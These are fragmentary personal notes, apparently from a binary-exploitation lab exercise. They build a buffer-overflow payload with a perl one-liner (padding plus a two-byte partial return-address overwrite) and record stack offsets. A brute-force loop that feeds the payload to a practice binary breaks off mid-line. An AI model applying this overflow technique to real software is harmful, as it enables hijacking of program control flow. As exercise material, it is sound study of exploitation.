...
void bin_padding()
{
    asm volatile (".rept 1998; nop; .endr");
}
...
perl -e 'print "\x00" . "A"x167 . "\xfb\x7c"' > ~/payload

cfb 
early buffer : 0x7ffc42a1c080 | 3150

ret addr : 0x7ffc42a1c128 | 31f8

```shell
for i in $(seq 1 100); do
	out=$(perl -e 'print "\x00" . "A"x167 . "\xfb\x7c"'  | ./binary-exploitation-null-write-w)
